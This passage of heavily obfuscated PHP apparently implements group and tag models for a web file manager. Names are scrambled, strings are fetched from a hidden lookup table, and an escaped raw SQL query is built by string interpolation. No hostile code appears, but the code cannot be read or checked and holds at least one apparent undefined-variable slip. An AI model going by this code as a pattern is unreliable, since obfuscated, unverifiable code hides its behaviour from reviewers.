$this->metaSet($šÙçƒ¤£, $Ö„‚Éà­[505], null); $this->metaSet($šÙçƒ¤£, $Ö„‚Éà­[504], null); return; } $ÃŠ¹¯Ï¹ = array($Ö„‚Éà­[505] => str_replace($Ö„‚Éà­[53], $Ö„‚Éà­[12], Pinyin::get($™»š°§“)), $Ö„‚Éà­[504] => Pinyin::get($™»š°§“, $Ö„‚Éà­[623])); $this->metaSet($šÙçƒ¤£, $ÃŠ¹¯Ï¹); } protected function groupStatus($Î‡ç¥ğö, $´ì ôøì) { $„Š‡ÑÃÀ =& $_SERVER[™»È’øè]; $ÌĞî÷¯° = $this->getInfoSimple($Î‡ç¥ğö); if (!$ÌĞî÷¯°) { return !1; } if ($´ì ôøì == $„Š‡ÑÃÀ[88]) { $¦ºÚÜÂ = $this->parentLevelArray($ÌĞî÷¯°[$„Š‡ÑÃÀ[552]]); } else { $ÇÏ´šçâ = array($„Š‡ÑÃÀ[619] => array($„Š‡ÑÃÀ[579], $ÌĞî÷¯°[$„Š‡ÑÃÀ[552]] . $ÌĞî÷¯°[$„Š‡ÑÃÀ[1870]] . $„Š‡ÑÃÀ[580])); $¦ºÚÜÂ = $this->where($ÇÏ´šçâ)->field($„Š‡ÑÃÀ[1870])->select(); $¦ºÚÜÂ = array_to_keyvalue($¦ºÚÜÂ, $„Š‡ÑÃÀ[12], $„Š‡ÑÃÀ[1870]); } $¦ºÚÜÂ[] = $ÌĞî÷¯°[$„Š‡ÑÃÀ[1870]]; $ãê¸Á› = array(); foreach ($¦ºÚÜÂ as $Î‡ç¥ğö) { $ãê¸Á›[] = array($„Š‡ÑÃÀ[1870] => $Î‡ç¥ğö, $„Š‡ÑÃÀ[94] => $„Š‡ÑÃÀ[775], $„Š‡ÑÃÀ[417] => $´ì ôøì); $this->_clearCache($Î‡ç¥ğö); } return Model($„Š‡ÑÃÀ[1959])->addAll($ãê¸Á›, array(), !0); } protected function groupRemove($óØåúÈ¡, $ã…‘Î°Ø = false) { $ı‰¡¬“± =& $_SERVER[™»È’øè]; $Àè€¿ÅÏ = array($ı‰¡¬“±[1870] => $óØåúÈ¡); $ŒŸœ¿ì¹ = $this->where($Àè€¿ÅÏ)->find(); if (!$ŒŸœ¿ì¹ || $ŒŸœ¿ì¹[$ı‰¡¬“±[179]] == 0) { return !1; } if (!$ã…‘Î°Ø) { $¨Íª–à = $this->getInfoSimple($ŒŸœ¿ì¹[$ı‰¡¬“±[179]]); $this->_changeChildLevel($ŒŸœ¿ì¹, $¨Íª–à, !0); $this->where(array($ı‰¡¬“±[179] => $óØåúÈ¡))->save(array($ı‰¡¬“±[179] => $ŒŸœ¿ì¹[$ı‰¡¬“±[179]])); $this->_clearCache($¨Íª–à[$ı‰¡¬“±[1870]]); } Model($ı‰¡¬“±[1959])->where($Àè€¿ÅÏ)->delete(); Model($ı‰¡¬“±[1960])->where($Àè€¿ÅÏ)->delete(); Model($ı‰¡¬“±[850])->groupRootRemove($óØåúÈ¡); $this->_clearCache($ŒŸœ¿ì¹[$ı‰¡¬“±[179]]); return $this->where($Àè€¿ÅÏ)->delete(); } protected function groupSort($®ª³·¥) { $œ‘³ˆœÓ =& $_SERVER[™»È’øè]; $öµê®È— = array(); foreach ($®ª³·¥ as $¨ ñ®ôæ => $î‰®¤£İ) { $öµê®È—[] = array($œ‘³ˆœÓ[1870], $î‰®¤£İ, $œ‘³ˆœÓ[1894], $¨ ñ®ôæ + 1); } $this->saveAll($öµê®È—); } public function listData() { $ï¿êÂ¬İ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ï¿êÂ¬İ[$_SERVER[™»È’øè][412]]); return $ï¿êÂ¬İ; } private function _makeOrder($†‚²¡Õú = '') { $èÅÑÜš• =& $_SERVER[™»È’øè]; $ïĞàÓ‹º = array($èÅÑÜš•[1870], $èÅÑÜš•[32], $èÅÑÜš•[1859], $èÅÑÜš•[214]); $Ñ±…‡Ûë = array($èÅÑÜš•[490] => $èÅÑÜš•[491], $èÅÑÜš•[492] => $èÅÑÜš•[493]); $‰®Ä’Æè = Input::get($èÅÑÜš•[497], $èÅÑÜš•[7], $èÅÑÜš•[1874], $ïĞàÓ‹º); $š£×¡Ä– = Input::get($èÅÑÜš•[498], $èÅÑÜš•[7], $èÅÑÜš•[1961], array($èÅÑÜš•[1961], $èÅÑÜš•[492])); $š£×¡Ä– = $Ñ±…‡Ûë[$š£×¡Ä–]; $†‚²¡Õú = $†‚²¡Õú . "{$‰®Ä’Æè}\40{$š£×¡Ä–}\54\x20\147\162\x6f\165\x70\111\104\x20\141\163\x63"; return $this->order($†‚²¡Õú); } public function listChild($¹Íõ½¼’) { $å±÷¯ëñ =& $_SERVER[™»È’øè]; $Ä´Õªü† = $this->where(array($å±÷¯ëñ[179] => $¹Íõ½¼’))->_makeOrder()->selectPage(200); $this->_listDataApply($Ä´Õªü†[$å±÷¯ëñ[412]]); return $Ä´Õªü†; } public function listChildIds($½Š¥şå‡) { $¿¯çî£ =& $_SERVER[™»È’øè]; if (is_string($öŞµ‰ÔÍ)) { $½Š¥şå‡ = explode($¿¯çî£[50], $½Š¥şå‡); } $£İøÇÅ­ = $this->where(array($¿¯çî£[1870] => array($¿¯çî£[7], $½Š¥şå‡)))->field($¿¯çî£[1962])->select(); if (!$£İøÇÅ­) { return !1; } $ÕğàÂ³Ú = array(); foreach ($£İøÇÅ­ as $ØëÔİâ) { $ÕğàÂ³Ú[] = "\163\x65\x6c\x65\x63\164\x20\x67\x72\x6f\165\160\x49\104\40\x66\162\157\x6d\40\x60\147\x72\157\x75\160\x60\40\x77\x68\x65\x72\145\40\160\141\162\x65\x6e\x74\x4c\145\166\x65\x6c\40\x6c\x69\x6b\x65\40\47{$ØëÔİâ[$¿¯çî£[552]]}{$ØëÔİâ[$¿¯çî£[1870]]}\x2c\x25\x27"; } $ÕğàÂ³Ú = implode($¿¯çî£[1963], $ÕğàÂ³Ú); $£İøÇÅ­ = $this->query($ÕğàÂ³Ú); if (!$£İøÇÅ­) { return array(); } $½Š¥şå‡ = array_to_keyvalue($£İøÇÅ­, $¿¯çî£[12], $¿¯çî£[1870]); return array_unique($½Š¥şå‡); } public function listByID($¾·©Û‡Ÿ) { $£ÒîÒˆù =& $_SERVER[™»È’øè]; if (!$¾·©Û‡Ÿ) { return array(); } $ÔúŸ˜ÇŒ = array($£ÒîÒˆù[1870] => array($£ÒîÒˆù[7], $¾·©Û‡Ÿ)); $ÜŸ«›Ä¶ = $this->where($ÔúŸ˜ÇŒ)->select(); $ÜŸ«›Ä¶ = array_sort_keep($ÜŸ«›Ä¶, $£ÒîÒˆù[1870], $¾·©Û‡Ÿ); $this->_listDataApply($ÜŸ«›Ä¶); return $ÜŸ«›Ä¶; } public function listSearch($±‘õßµÓ) { $Ÿ¯¸®Ìş =& $_SERVER[™»È’øè]; $¿ßˆ·§İ = $±‘õßµÓ[$Ÿ¯¸®Ìş[1964]]; $æ‰³æ‹­ = isset($±‘õßµÓ[$Ÿ¯¸®Ìş[1965]]) ? $±‘õßµÓ[$Ÿ¯¸®Ìş[1965]] : !1; if (!trim($¿ßˆ·§İ)) { return !1; } $¿ßˆ·§İ = str_replace($Ÿ¯¸®Ìş[1966], $Ÿ¯¸®Ìş[1967], $¿ßˆ·§İ); $¡²»Ÿ† = array($Ÿ¯¸®Ìş[1870] => array($Ÿ¯¸®Ìş[426], "{$¿ßˆ·§İ}\x25"), $Ÿ¯¸®Ìş[32] => array($Ÿ¯¸®Ìş[426], "\45{$¿ßˆ·§İ}\45"), $Ÿ¯¸®Ìş[1030] => $Ÿ¯¸®Ìş[1968]); if ($æ‰³æ‹­) { $¾Œ«—ö = $this->getInfoSimple($æ‰³æ‹­); $öÌ¬«ØÁ = $¾Œ«—ö[$Ÿ¯¸®Ìş[552]] . $æ‰³æ‹­ . $Ÿ¯¸®Ìş[580]; $¡²»Ÿ† = array($¡²»Ÿ†, array($Ÿ¯¸®Ìş[552] => array($Ÿ¯¸®Ìş[426], $öÌ¬«ØÁ))); } $¡²»Ÿ† = $this->parseWhereLike($¡²»Ÿ†); $õÒâ™Ö™ = $this->_makeOrder()->where($¡²»Ÿ†)->selectPage(20); $õÒâ™Ö™ = $õÒâ™Ö™ ? $õÒâ™Ö™ : array($Ÿ¯¸®Ìş[412] => array(), $Ÿ¯¸®Ìş[409] => array()); if (!$õÒâ™Ö™ || count($õÒâ™Ö™[$Ÿ¯¸®Ìş[412]]) < 5 && Input::check($¿ßˆ·§İ, $Ÿ¯¸®Ìş[361])) { $ÀÁæ»¨ = $this->groupChildrenAll($æ‰³æ‹­); $Øä®ˆºƒ = $this->_searchFromMeta($Ÿ¯¸®Ìş[504], $¿ßˆ·§İ, 10, $ÀÁæ»¨); $‹âà›èŠ = $this->_searchFromMeta($Ÿ¯¸®Ìş[505], $¿ßˆ·§İ, 10, $ÀÁæ»¨); $¨ÆÜä»· = array_merge($Øä®ˆºƒ, $‹âà›èŠ, $õÒâ™Ö™[$Ÿ¯¸®Ìş[412]]); $õÒâ™Ö™[$Ÿ¯¸®Ìş[412]] = array_unique_by_key($¨ÆÜä»·, $Ÿ¯¸®Ìş[1870]); $õÒâ™Ö™[$Ÿ¯¸®Ìş[409]][$Ÿ¯¸®Ìş[410]] = count($õÒâ™Ö™[$Ÿ¯¸®Ìş[412]]); $õÒâ™Ö™[$Ÿ¯¸®Ìş[409]][$Ÿ¯¸®Ìş[411]] = ceil($õÒâ™Ö™[$Ÿ¯¸®Ìş[409]][$Ÿ¯¸®Ìş[410]] / $õÒâ™Ö™[$Ÿ¯¸®Ìş[409]][$Ÿ¯¸®Ìş[406]]); } $this->_listDataApply($õÒâ™Ö™[$Ÿ¯¸®Ìş[412]]); return $õÒâ™Ö™; } protected function groupChildrenAll($¿îğù¡Ç) { $€‚ÁóÆÑ =& $_SERVER[™»È’øè]; if (!$¿îğù¡Ç) { return !1; } if (is_string($¿îğù¡Ç)) { $¿îğù¡Ç = array($¿îğù¡Ç); } $…÷Ì„ò  = $¿îğù¡Ç; foreach ($¿îğù¡Ç as $Û›ãÏ™¸) { $ÑÏ‰¯ÜŸ = $this->getInfoSimple($Û›ãÏ™¸); $£­Ñ•î” = array($€‚ÁóÆÑ[552] => array($€‚ÁóÆÑ[426], $ÑÏ‰¯ÜŸ[$€‚ÁóÆÑ[552]] . $Û›ãÏ™¸ . $€‚ÁóÆÑ[580])); $âÛ±ó¬ş = $this->field($€‚ÁóÆÑ[1870])->where($£­Ñ•î”)->select(); $…÷Ì„ò  = array_merge($…÷Ì„ò , array_to_keyvalue($âÛ±ó¬ş, $€‚ÁóÆÑ[12], $€‚ÁóÆÑ[1870])); } return array_unique($…÷Ì„ò ); } private function _searchFromMeta($¹² »Û, $ÜÙêŸ, $ ’†úîê, $É»‹§¿¢) { $úĞÓÍ¿ñ =& $_SERVER[™»È’øè]; $ÜÙêŸ = strtolower($ÜÙêŸ); $‡‹·¬ = array($úĞÓÍ¿ñ[94] => $¹² »Û, $úĞÓÍ¿ñ[417] => array($úĞÓÍ¿ñ[426], "\45{$ÜÙêŸ}\x25")); $‡‹·¬ = $this->parseWhereLike($‡‹·¬); if ($É»‹§¿¢) { $‡‹·¬[$úĞÓÍ¿ñ[1870]] = array($úĞÓÍ¿ñ[7], $É»‹§¿¢); } $˜¼¥ÕÏì = Model($úĞÓÍ¿ñ[1969])->where($‡‹·¬)->limit($ ’†úîê)->select(); if (!$˜¼¥ÕÏì) { return array(); } $˜¼¥ÕÏì = array_to_keyvalue($˜¼¥ÕÏì, $úĞÓÍ¿ñ[12], $úĞÓÍ¿ñ[1870]); $…­ªÒØò = $this->where(array($úĞÓÍ¿ñ[1958] => array($úĞÓÍ¿ñ[7], $˜¼¥ÕÏì)))->select(); if (!$…­ªÒØò) { return array(); } return $…­ªÒØò; } protected function _listDataApplyItem($¬Â¦—ÃÓ) { $€££´“© = array($¬Â¦—ÃÓ); $this->_listDataApply($€££´“©); return $€££´“©[0]; } protected function _listDataApply(&$¢çÌ¢çé) { $ÁµíØšŸ =& $_SERVER[™»È’øè]; if (!$¢çÌ¢çé) { return; } $íÌÍíñâ = array_to_keyvalue($¢çÌ¢çé, $ÁµíØšŸ[12], $ÁµíØšŸ[1870]); $this->_listAppendChildren($¢çÌ¢çé); $this->_listAppendChildrenMember($¢çÌ¢çé); $this->_listAppendMeta($¢çÌ¢çé, $íÌÍíñâ); $this->_listAppendParent($¢çÌ¢çé); $this->_listAppendSourceRoot($¢çÌ¢çé, $íÌÍíñâ); } private function _listAppendChildren(&$¶§™åôà) { $¾¤éÏÔ =& $_SERVER[™»È’øè]; $Õ®¥šÓ³ = array_to_keyvalue($¶§™åôà, $¾¤éÏÔ[12], $¾¤éÏÔ[1870]); $Ä²ıÛ• = array($¾¤éÏÔ[179] => array($¾¤éÏÔ[7], $Õ®¥šÓ³)); $ÛÜ‡‰èı = array($¾¤éÏÔ[179], $¾¤éÏÔ[1970] => $¾¤éÏÔ[532]); $£Ó”ìë = $this->field($ÛÜ‡‰èı)->where($Ä²ıÛ•)->group($¾¤éÏÔ[179])->select(); $—šœÔå = array_to_keyvalue($£Ó”ìë, $¾¤éÏÔ[179], $¾¤éÏÔ[532]); foreach ($¶§™åôà as &$¨¬ÆÓğÇ) { $ÌãÅ£±› = $¨¬ÆÓğÇ[$¾¤éÏÔ[1870]]; $¨¬ÆÓğÇ[$¾¤éÏÔ[1971]] = isset($—šœÔå[$ÌãÅ£±›]) ? intval($—šœÔå[$ÌãÅ£±›]) : !1; } unset($¨¬ÆÓğÇ); } private function _listAppendChildrenMember(&$öÎ£‡±ø) { $•ğğÎ¤ =& $_SERVER[™»È’øè]; $Ñ½Áã‹™ = array_to_keyvalue($öÎ£‡±ø, $•ğğÎ¤[12], $•ğğÎ¤[1870]); $à¤Û¢“¨ = array($•ğğÎ¤[1870] => array($•ğğÎ¤[7], $Ñ½Áã‹™)); $«öËŸÀ = array($•ğğÎ¤[1870], $•ğğÎ¤[1970] => $•ğğÎ¤[532]); $‹“‚·øƒ = Model($•ğğÎ¤[1960])->field($«öËŸÀ)->where($à¤Û¢“¨)->group($•ğğÎ¤[1870])->select(); $Ôø”õ¸Ã = array_to_keyvalue($‹“‚·øƒ, $•ğğÎ¤[1870], $•ğğÎ¤[532]); foreach ($öÎ£‡±ø as &$Ô»ï¶Òİ) { $™»ƒ«ƒä = $Ô»ï¶Òİ[$•ğğÎ¤[1870]]; $Ô»ï¶Òİ[$•ğğÎ¤[1972]] = isset($Ôø”õ¸Ã[$™»ƒ«ƒä]) ? intval($Ôø”õ¸Ã[$™»ƒ«ƒä]) : !1; } unset($Ô»ï¶Òİ); } private function _listAppendMeta(&$À‘¦Í‘, $Ú´İ©Ôå) { $ë“×©¹ =& $_SERVER[™»È’øè]; $çŠ³§«È = array($ë“×©¹[1870] => array($ë“×©¹[7], $Ú´İ©Ôå)); $´İÒ«ûí = Model($ë“×©¹[1959])->where($çŠ³§«È)->select(); $´İÒ«ûí = array_to_keyvalue_group($´İÒ«ûí, $ë“×©¹[1870]); foreach ($´İÒ«ûí as &$Ïšì¢ş‹) { $Ïšì¢ş‹ = array_to_keyvalue($Ïšì¢ş‹, $ë“×©¹[94], $ë“×©¹[417]); } unset($Ïšì¢ş‹); foreach ($À‘¦Í‘ as &$“¸¿æË¯) { $“¸¿æË¯[$ë“×©¹[506]] = array(); if (isset($´İÒ«ûí[$“¸¿æË¯[$ë“×©¹[1870]]])) { $“¸¿æË¯[$ë“×©¹[506]] = $´İÒ«ûí[$“¸¿æË¯[$ë“×©¹[1870]]]; } } unset($“¸¿æË¯); } protected function parentLevelArray($å¸¯á›§) { $ì‘É”úí =& $_SERVER[™»È’øè]; $å¸¯á›§ = explode($ì‘É”úí[50], trim($å¸¯á›§, $ì‘É”úí[50])); $å¸¯á›§ = array_remove_value($å¸¯á›§, $ì‘É”úí[211]); return $å¸¯á›§; } protected function parentInGroup($Àçôñöé, $’†Éƒæï) { $û¬ÙİÚ´ =& $_SERVER[™»È’øè]; $¢¦àß‡ = $this->getInfoSimple($Àçôñöé); if (!$¢¦àß‡) { return !0; } $Î—ï†û¬ = $this->parentLevelArray($¢¦àß‡[$û¬ÙİÚ´[552]]); $Î—ï†û¬[] = $Àçôñöé; foreach ($Î—ï†û¬ as $Àçôñöé) { if (in_array($Àçôñöé . $û¬ÙİÚ´[12], $’†Éƒæï)) { return !0; } } return !1; } private function _listAppendParent(&$ÎÉÜÔÇˆ) { $ĞÓö©è =& $_SERVER[™»È’øè]; $Â—û°ç¬ = array(); foreach ($ÎÉÜÔÇˆ as &$Š¼ÁÊïü) { $Â—û°ç¬[$Š¼ÁÊïü[$ĞÓö©è[1870]]] = $Š¼ÁÊïü[$ĞÓö©è[32]]; $™¦ËŠÔ¯ = $this->parentLevelArray($Š¼ÁÊïü[$ĞÓö©è[552]]); foreach ($™¦ËŠÔ¯ as $‚Ÿš°äÆ) { if (!isset($Â—û°ç¬[$‚Ÿš°äÆ])) { $Â—û°ç¬[$‚Ÿš°äÆ] = 0; } } } unset($Š¼ÁÊïü); foreach ($Â—û°ç¬ as $«•ÚÔäè => $†É×êË¸) { if ($†É×êË¸) { continue; } $ı€‰‚ = $this->getInfoSimple($«•ÚÔäè); $Â—û°ç¬[$«•ÚÔäè] = $ı€‰‚[$ĞÓö©è[32]]; } $ºá•Û‹ê = $GLOBALS[$ĞÓö©è[6]][$ĞÓö©è[89]][$ĞÓö©è[1973]]; if ($GLOBALS[$ĞÓö©è[535]] == $ĞÓö©è[88]) { $ºá•Û‹ê = !1; } foreach ($ÎÉÜÔÇˆ as &$Š¼ÁÊïü) { $™¦ËŠÔ¯ = $this->parentLevelArray($Š¼ÁÊïü[$ĞÓö©è[552]]); $ˆå‡‘˜Ë = $ĞÓö©è[12]; foreach ($™¦ËŠÔ¯ as $«•ÚÔäè => $‚Ÿš°äÆ) { if ($ºá•Û‹ê && $«•ÚÔäè == 0) { continue; } $ˆå‡‘˜Ë .= $Â—û°ç¬[$‚Ÿš°äÆ] . $ĞÓö©è[8]; } if ($™¦ËŠÔ¯) { $ˆå‡‘˜Ë .= $Š¼ÁÊïü[$ĞÓö©è[32]]; } $Š¼ÁÊïü[$ĞÓö©è[557]] = str_replace($ĞÓö©è[560], $ĞÓö©è[8], $ˆå‡‘˜Ë); } unset($Š¼ÁÊïü); } private function _listAppendSourceRoot(&$·İıÚ¸”, $¯©òä¢ñ) { $Ø¯©ÛœÛ =& $_SERVER[™»È’øè]; $ç†¾äĞã = Model($Ø¯©ÛœÛ[850])->listSourceRoot(SourceModel::TYPE_GROUP, $¯©òä¢ñ); $ç†¾äĞã = array_to_keyvalue($ç†¾äĞã, $Ø¯©ÛœÛ[537]); $ç†¾äĞã = array_remove_key($ç†¾äĞã, $Ø¯©ÛœÛ[537]); foreach ($·İıÚ¸” as &$âİùÛÑØ) { $âİùÛÑØ[$Ø¯©ÛœÛ[87]] = $ç†¾äĞã[$âİùÛÑØ[$Ø¯©ÛœÛ[1870]]] ? $ç†¾äĞã[$âİùÛÑØ[$Ø¯©ÛœÛ[1870]]] : array(); } unset($âİùÛÑØ); } protected function groupMerge($ŒÑÏ—Ä) { $ŒÑÏ—Ä = array_values(array_unique($ŒÑÏ—Ä)); $×Ø»‹Ï¤ = array(); for ($ÌË®ÎÈ­ = 0; $ÌË®ÎÈ­ < count($ŒÑÏ—Ä); $ÌË®ÎÈ­++) { $¸¡ÔÓ‘ê = !1; for ($ìÎĞ‚˜ = 0; $ìÎĞ‚˜ < count($ŒÑÏ—Ä); $ìÎĞ‚˜++) { if ($ÌË®ÎÈ­ == $ìÎĞ‚˜) { continue; } if ($this->isParentOf($ŒÑÏ—Ä[$ìÎĞ‚˜], $ŒÑÏ—Ä[$ÌË®ÎÈ­])) { $¸¡ÔÓ‘ê = !0; break; } } if (!$¸¡ÔÓ‘ê) { $×Ø»‹Ï¤[] = $ŒÑÏ—Ä[$ÌË®ÎÈ­]; } } return $×Ø»‹Ï¤; } protected function isParentOf($äı¯´Ğñ, $²üŠÔÑš) { $ÃŠ—–—à =& $_SERVER[™»È’øè]; if (!$äı¯´Ğñ || !$²üŠÔÑš || $äı¯´Ğñ == $²üŠÔÑš) { return !1; } $ƒÊàÍî = $this->getInfoSimple($äı¯´Ğñ); $»èÓÍõ‹ = $this->getInfoSimple($²üŠÔÑš); $ŸÚ÷œÛ© = $ƒÊàÍî[$ÃŠ—–—à[552]] . $äı¯´Ğñ . $ÃŠ—–—à[50]; if (substr($»èÓÍõ‹[$ÃŠ—–—à[552]], 0, strlen($ŸÚ÷œÛ©)) == $ŸÚ÷œÛ©) { return !0; } return !1; } public function groupShowRoot($Î¯«ÑŠœ, $º¨—ò = false) { $ñ¡×òÎñ =& $_SERVER[™»È’øè]; $Ô¹Ì—ë = $this->getInfo($Î¯«ÑŠœ); if (!$Ô¹Ì—ë) { return array(); } $¤Ñ¿ÕÆ = $this->parentLevelArray($Ô¹Ì—ë[$ñ¡×òÎñ[552]]); $¯Ä¨™… = array($Î¯«ÑŠœ); if (count($¤Ñ¿ÕÆ) == 0) { return $¯Ä¨™…; } if ($º¨—ò && count($¤Ñ¿ÕÆ) == 1) { return $¯Ä¨™…; } if (!$Ô¹Ì—ë[$ñ¡×òÎñ[506]] || !isset($Ô¹Ì—ë[$ñ¡×òÎñ[506]][$ñ¡×òÎñ[1956]]) || $Ô¹Ì—ë[$ñ¡×òÎñ[506]][$ñ¡×òÎñ[1956]] == $ñ¡×òÎñ[1925]) { return $this->groupShowRoot($¤Ñ¿ÕÆ[count($¤Ñ¿ÕÆ) - 1], $º¨—ò); } if ($Ô¹Ì—ë[$ñ¡×òÎñ[506]][$ñ¡×òÎñ[1956]] == $ñ¡×òÎñ[400]) { $Û“®ñ„ï = explode($ñ¡×òÎñ[50], $Ô¹Ì—ë[$ñ¡×òÎñ[506]][$ñ¡×òÎñ[1957]]); if ($Û“®ñ„ï) { $¯Ä¨™… = array_merge($¯Ä¨™…, $Û“®ñ„ï); } } return $¯Ä¨™…; } protected function resetParentLevel() { $±…Ş‹êÉ =& $_SERVER[™»È’øè]; $«îşüÛ¯ = $±…Ş‹êÉ[1870]; $ì›´ÔÌë = $this->select(); $ì›´ÔÌë = array_to_keyvalue($ì›´ÔÌë, $«îşüÛ¯); foreach ($ì›´ÔÌë as $áğ¬ÁÏ) { $Ï»ËÕÜ = $áğ¬ÁÏ; $âÚ‘Àù¨ = array(); while ($Ï»ËÕÜ[$±…Ş‹êÉ[179]] != 0) { $âÚ‘Àù¨[] = $Ï»ËÕÜ[$±…Ş‹êÉ[179]]; $Ï»ËÕÜ = $ì›´ÔÌë[$Ï»ËÕÜ[$±…Ş‹êÉ[179]]]; } $âÚ‘Àù¨[] = 0; $âÚ‘Àù¨ = $±…Ş‹êÉ[50] . implode($±…Ş‹êÉ[50], array_reverse($âÚ‘Àù¨)) . $±…Ş‹êÉ[50]; $this->setNamePinyin($áğ¬ÁÏ[$«îşüÛ¯], $áğ¬ÁÏ[$±…Ş‹êÉ[32]]); $this->where(array($«îşüÛ¯ => $áğ¬ÁÏ[$«îşüÛ¯]))->save(array($±…Ş‹êÉ[619] => $âÚ‘Àù¨)); } return $ì›´ÔÌë; } public function groupNameAuto($­Éµğ¢å, $æä‚’·Û) { $¬ûØ£ú =& $_SERVER[™»È’øè]; $úóöÄ¶» = $this->where(array($¬ûØ£ú[444] => $­Éµğ¢å))->getField($¬ûØ£ú[32], !0); if (!$úóöÄ¶» || !in_array($æä‚’·Û, $úóöÄ¶»)) { return $æä‚’·Û; } for ($‹å”­ç  = 1; $‹å”­ç  <= count($úóöÄ¶») + 1; $‹å”­ç ++) { $çş³Õ…ü = $æä‚’·Û . "\x28{$‹å”­ç }\x29"; if (!in_array($çş³Õ…ü, $úóöÄ¶»)) { return $çş³Õ…ü; } } } public function groupSwitch($§§¦í™Æ, $¶ûã°¢) { $²–¤ÌáÏ =& $_SERVER[™»È’øè]; $øÆ¥¬äõ = array($²–¤ÌáÏ[1870] => array($²–¤ÌáÏ[7], array($§§¦í™Æ, $¶ûã°¢))); $‘£ñ ª = $this->where($øÆ¥¬äõ)->select(); $‘£ñ ª = array_to_keyvalue($‘£ñ ª, $²–¤ÌáÏ[1870]); if (!isset($‘£ñ ª[$§§¦í™Æ]) || !isset($‘£ñ ª[$¶ûã°¢]) || $‘£ñ ª[$§§¦í™Æ][$²–¤ÌáÏ[179]] == 0) { return !1; } $øÆ¥¬äõ = array($²–¤ÌáÏ[1870] => $§§¦í™Æ); $Â¡ŠÔÈ™ = Model($²–¤ÌáÏ[1960])->where($øÆ¥¬äõ)->select(); if (!$Â¡ŠÔÈ™) { $Â¡ŠÔÈ™ = array(); } foreach ($Â¡ŠÔÈ™ as $Û§÷Î²) { $ºıÙı¸¿ = $Û§÷Î²[$²–¤ÌáÏ[1678]]; $øÆ¥¬äõ = array($²–¤ÌáÏ[1678] => $ºıÙı¸¿, $²–¤ÌáÏ[1870] => $¶ûã°¢); $›™Éß§â = Model($²–¤ÌáÏ[1960])->where($øÆ¥¬äõ)->find(); if (!$›™Éß§â) { $¬Ñéş¶ = array($¶ûã°¢ => $Û§÷Î²[$²–¤ÌáÏ[1974]]); Model($²–¤ÌáÏ[566])->userGroupAdd($ºıÙı¸¿, $¬Ñéş¶); } Model($²–¤ÌáÏ[566])->userGroupRemove($ºıÙı¸¿, $§§¦í™Æ); } $øÆ¥¬äõ = array($²–¤ÌáÏ[177] => 2, $²–¤ÌáÏ[179] => 0, $²–¤ÌáÏ[452] => 1, $²–¤ÌáÏ[537] => array($²–¤ÌáÏ[7], array($§§¦í™Æ, $¶ûã°¢))); $ñ’¸»´ = Model($²–¤ÌáÏ[850])->where($øÆ¥¬äõ)->field($²–¤ÌáÏ[1975])->select(); $ñ’¸»´ = array_to_keyvalue($ñ’¸»´, $²–¤ÌáÏ[537], $²–¤ÌáÏ[180]); $ä££¨Ğ = !empty($ñ’¸»´[$§§¦í™Æ]) ? $ñ’¸»´[$§§¦í™Æ] : !1; if ($ä££¨Ğ) { if (!$ñ’¸»´[$¶ûã°¢]) { $ñ’¸»´[$¶ûã°¢] = Model($²–¤ÌáÏ[850])->groupRootAdd($¶ûã°¢); } $¦§¦«² = $ñ’¸»´[$¶ûã°¢]; $øÆ¥¬äõ = array($²–¤ÌáÏ[179] => $ä££¨Ğ); $ñ’¸»´ = Model($²–¤ÌáÏ[850])->where($øÆ¥¬äõ)->field($²–¤ÌáÏ[1976])->select(); if (!$ñ’¸»´) { $ñ’¸»´ = array(); } Model($²–¤ÌáÏ[850])->moveClearAuth = !1; foreach ($ñ’¸»´ as $ÀÑ³¨½Ü) { $ÚÚ«†½ = $ÀÑ³¨½Ü[$²–¤ÌáÏ[452]] == $²–¤ÌáÏ[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($²–¤ÌáÏ[850])->move($ÀÑ³¨½Ü[$²–¤ÌáÏ[180]], $¦§¦«², $ÚÚ«†½); } Model($²–¤ÌáÏ[850])->moveClearAuth = !0; $øÆ¥¬äõ = array($²–¤ÌáÏ[177] => 2, $²–¤ÌáÏ[537] => $§§¦í™Æ); $®ï³­Ü = array($²–¤ÌáÏ[537] => $¶ûã°¢); Model($²–¤ÌáÏ[1977])->where($øÆ¥¬äõ)->save($®ï³­Ü); Model($²–¤ÌáÏ[1978])->where($øÆ¥¬äõ)->save($®ï³­Ü); } $this->_changeChildLevel($‘£ñ ª[$§§¦í™Æ], $‘£ñ ª[$¶ûã°¢], !0); $this->where(array($²–¤ÌáÏ[179] => $§§¦í™Æ))->save(array($²–¤ÌáÏ[179] => $¶ûã°¢)); $this->_clearChildrenCache($‘£ñ ª[$¶ûã°¢]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($Õİ‡Ş¥Ü) { $¶œšÀå =& $_SERVER[™»È’øè]; return array($¶œšÀå[1979] => array($Õİ‡Ş¥Ü[0], $¶œšÀå[1980]), $¶œšÀå[1981] => array($Õİ‡Ş¥Ü[0], $¶œšÀå[1982])); } protected function get($¶‘¤áàû) { $©õœæé =& $_SERVER[™»È’øè]; $ç¢Ğä³ = Model($©õœæé[553])->metaGet($¶‘¤áàû, $©õœæé[1983]); $´¤Ó‹¶Å = json_decode($ç¢Ğä³, !0); return $´¤Ó‹¶Å ? $´¤Ó‹¶Å : array($©õœæé[1984] => $©õœæé[88], $©õœæé[412] => array()); } protected function set($şıÃÜù©, $¨ğÕ¾Ÿö) { $İù†Ôİ =& $_SERVER[™»È’øè]; $¨ğÕ¾Ÿö = $¨ğÕ¾Ÿö ? $¨ğÕ¾Ÿö : array($İù†Ôİ[1984] => $İù†Ôİ[88], $İù†Ôİ[412] => array()); return Model($İù†Ôİ[553])->metaSet($şıÃÜù©, $İù†Ôİ[1983], json_encode($¨ğÕ¾Ÿö)); } protected function getByTagID($Ë¶¯Îøù, $ëŒ¼Ğâæ) { $´ÇÑ‹‡ =& $_SERVER[™»È’øè]; if (!$Ë¶¯Îøù || !$ëŒ¼Ğâæ) { return !1; } if (!Model($´ÇÑ‹‡[553])->getInfoSimple($Ë¶¯Îøù)) { return !1; } $ÈÒÙ‰Ö = $this->get($Ë¶¯Îøù); if (!$ÈÒÙ‰Ö || !isset($ÈÒÙ‰Ö[$´ÇÑ‹‡[412]])) { return !1; } $‘±¹ªº‡ = array_find_by_field($ÈÒÙ‰Ö[$´ÇÑ‹‡[412]], $´ÇÑ‹‡[442], $ëŒ¼Ğâæ); return is_array($‘±¹ªº‡) ? $‘±¹ªº‡ : !1; } public function listSource($Ê™‰Ù¯, $†ÖÊ‚‹Å) { $Ã·¨Ÿ§¸ =& 